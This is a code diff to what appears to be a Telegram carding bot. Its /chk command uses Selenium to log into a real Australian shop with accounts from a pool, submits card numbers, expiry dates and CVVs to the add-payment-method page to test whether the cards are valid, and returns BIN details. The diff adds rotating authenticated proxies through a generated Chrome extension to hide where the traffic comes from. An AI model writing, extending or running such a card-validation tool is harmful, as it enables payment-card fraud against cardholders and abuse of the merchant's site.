@@ -6787,7 +6787,73 @@ async def bt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = await update.message.reply_text(f"💳 `{card_str}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
         Process(target=run_bt_check, args=(card_str, update.effective_chat.id, msg.message_id), daemon=True).start()
 
-# ==== 10. /chk Command (FINAL - FILE + SS FIXED) ==== #
+# ==== 10. /chk Command (FINAL - FILE + SS FIXED + PROXY) ====
+
+import os, random, time, traceback, zipfile
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+
+# =========================
+# 🔹 PROXY SYSTEM
+# =========================
+
+PROXY_FILE = "proxy.txt"
+
+def _load_proxies():
+    if not os.path.exists(PROXY_FILE):
+        return []
+    with open(PROXY_FILE, "r") as f:
+        return [x.strip() for x in f if x.strip()]
+
+def _get_proxy():
+    proxies = _load_proxies()
+    return random.choice(proxies) if proxies else None
+
+def _create_proxy_plugin(host, port, user, pwd):
+    manifest = """
+    {
+        "version": "1.0",
+        "manifest_version": 2,
+        "name": "Proxy",
+        "permissions": ["proxy","tabs","unlimitedStorage","storage","<all_urls>","webRequest","webRequestBlocking"],
+        "background": {"scripts": ["background.js"]}
+    }
+    """
+
+    background = f"""
+    var config = {{
+        mode: "fixed_servers",
+        rules: {{
+          singleProxy: {{
+            scheme: "http",
+            host: "{host}",
+            port: parseInt({port})
+          }}
+        }}
+    }};
+    chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
+
+    chrome.webRequest.onAuthRequired.addListener(
+      function(details) {{
+        return {{authCredentials: {{username: "{user}", password: "{pwd}"}}}};
+      }},
+      {{urls: ["<all_urls>"]}},
+      ['blocking']
+    );
+    """
+
+    plugin = f"/tmp/proxy_{random.randint(1000,9999)}.zip"
+    with zipfile.ZipFile(plugin, 'w') as zp:
+        zp.writestr("manifest.json", manifest)
+        zp.writestr("background.js", background)
+
+    return plugin
+
+
+# =========================
+# 🔹 ACCOUNTS
+# =========================
 
 def get_chk_accounts():
     accounts = []
@@ -6807,12 +6873,11 @@ def get_chk_accounts():
     return accounts
 
 
-def run_chk_process(card_input):
-    import random, time, traceback
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support import expected_conditions as EC
+# =========================
+# 🔹 MAIN PROCESS
+# =========================
 
+def run_chk_process(card_input):
     start = time.time()
     driver = None
 
@@ -6823,7 +6888,27 @@ def run_chk_process(card_input):
 
         email, password = random.choice(accounts)
 
-        driver = create_killer_driver()
+        # =========================
+        # 🔹 CREATE DRIVER OPTIONS
+        # =========================
+        options = get_optimized_chrome_options(fast_mode=True)
+
+        proxy = _get_proxy()
+        proxy_ip = "NO PROXY"
+
+        if proxy:
+            try:
+                host, port, user, pwd = proxy.split(":")
+                plugin = _create_proxy_plugin(host, port, user, pwd)
+                options.add_extension(plugin)
+                proxy_ip = host
+            except Exception as e:
+                print("Proxy parse error:", e)
+
+        # 🔥 CREATE DRIVER (IMPORTANT: use options here)
+        service = Service(CHROME_DRIVER_PATH)
+        driver = webdriver.Chrome(service=service, options=options)
+
         wait = WebDriverWait(driver, 8)
 
         url = "https://shop.pottyplant.com.au/my-account/add-payment-method/"
@@ -6840,11 +6925,11 @@ def run_chk_process(card_input):
 
         time.sleep(2)
 
-        # 🔥 FORCE REDIRECT AFTER LOGIN
+        # ===== REDIRECT =====
         driver.get(url)
         wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
 
-        # ===== WAIT FOR SUBMIT BUTTON =====
+        # ===== SUBMIT BUTTON =====
         add_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))
 
         cc, mm, yy, cvv = killer_split_card(card_input)
@@ -6859,10 +6944,8 @@ def run_chk_process(card_input):
 
                 if "number" in src:
                     driver.find_element(By.NAME, "credit-card-number").send_keys(cc)
-
                 elif "expiration" in src:
                     driver.find_element(By.NAME, "expiration").send_keys(mm + yy)
-
                 elif "cvv" in src:
                     driver.find_element(By.NAME, "cvv").send_keys(cvv)
 
@@ -6887,7 +6970,7 @@ def run_chk_process(card_input):
         duration = round(time.time() - start, 2)
         bin_info, bin_flag = get_cached_bin_info(cc[:6])
 
-        # ✅ CLOSE DRIVER ONLY ON SUCCESS
+        # ===== CLOSE DRIVER ONLY ON SUCCESS =====
         try:
             driver.quit()
         except:
@@ -6898,16 +6981,15 @@ def run_chk_process(card_input):
             "response": response,
             "time": duration,
             "bin": f"{bin_info} {bin_flag}",
-            "account": email
+            "account": email,
+            "proxy": proxy_ip
         }
 
     except Exception:
-        # ❗ DO NOT CLOSE DRIVER HERE
         return {
             "error": traceback.format_exc(),
             "driver": driver
         }
-
 
 # ================= TELEGRAM CMD =================
 
